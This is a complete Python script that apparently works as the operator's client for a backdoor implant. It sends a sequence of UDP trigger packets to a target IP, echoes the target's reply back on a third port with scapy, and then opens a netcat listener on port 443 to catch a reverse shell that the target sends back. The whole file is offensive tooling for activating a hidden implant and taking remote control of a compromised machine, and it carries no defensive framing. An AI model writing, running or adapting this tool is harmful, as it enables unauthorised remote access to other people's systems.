import socket
from scapy.all import *
import os
import subprocess
import sys
import platform
import time
import random


dest_ip = sys.argv[1]
# dest_ip = "127.0.0.1"
dest_port1 = 40296
dest_port2 = 29640
dest_port3 = 64920
listen_ip = "0.0.0.0"
listen_port = 46290


def listen():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((listen_ip, listen_port))
    print(f'Listener started on {listen_ip}:{listen_port}...')
    i = 0
    while i < 1:
        data, addr = sock.recvfrom(4096)
        message = data.decode('utf-8')
        print(f"Received packet from {addr}: {message}")
        i = i + 1
    sock.close()
    return message


def send_trigger1():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = ""
    try:
        print(f"Sending first trigger packet to {dest_ip} on port {dest_port1}")
        sock.sendto(message.encode(), (dest_ip, dest_port1))
    finally:
        sock.close()


def send_trigger2():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = "empty"
    try:
        print(f"Sending second trigger packet to {dest_ip} on port {dest_port2}")
        sock.sendto(message.encode(), (dest_ip, dest_port2))
    finally:
        sock.close()


def send_trigger3(message):
    pkt = IP(dst=dest_ip) / UDP(dport=dest_port3) / message
    # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # print(message)
    # pkt.show()
    try:
        print(f"Sending last trigger packet to {dest_ip} on port {dest_port3}")
        send(pkt)
        # sock.sendto(message.encode(), (dest_ip, dest_port3))
    finally:
        # sock.close()
        print("All triggers sent...\n")


def catch_shell():
    if os.name == 'posix':
        print("OS is posix...", end='')
        time.sleep(0.5)
        flavor = platform.system()
        print(f"and {flavor}...", end='')
        time.sleep(1)
        print("good, we can work with that.\n\nSetting up handler to catch callback...\n")
        if flavor.casefold() == 'Linux'.casefold():
            try:
                subprocess.run(["nc", "-nlvp", "443"])
            except Exception as e:
                print(f"ERROR: Failed to establish listener: {e}")
                exit(1)
        elif flavor.casefold() == 'Darwin'.casefold():
            try:
                subprocess.run(["nc", "-nlv", "443"])
            except Exception as e:
                print(f"ERROR: Failed to establish listener: {e}")
                exit(1)
        elif flavor.casefold() == 'Windows'.casefold():
            print("I didn't even think this would get this far on Windows...let's try...\n")
            try:
                subprocess.run(["nc", "-nvp", "443"])
            except Exception as e:
                print(f"Oh look, it didn't work -- {e}")
                exit(1)


def main():
    print("Beginning trigger sequence...\n")
    try:
        send_trigger1()
        send_trigger2()
        message = listen()
        send_trigger3(message)
        catch_shell()
    except KeyboardInterrupt:
        print('')

    exit(0)


if __name__ == "__main__":
    main()
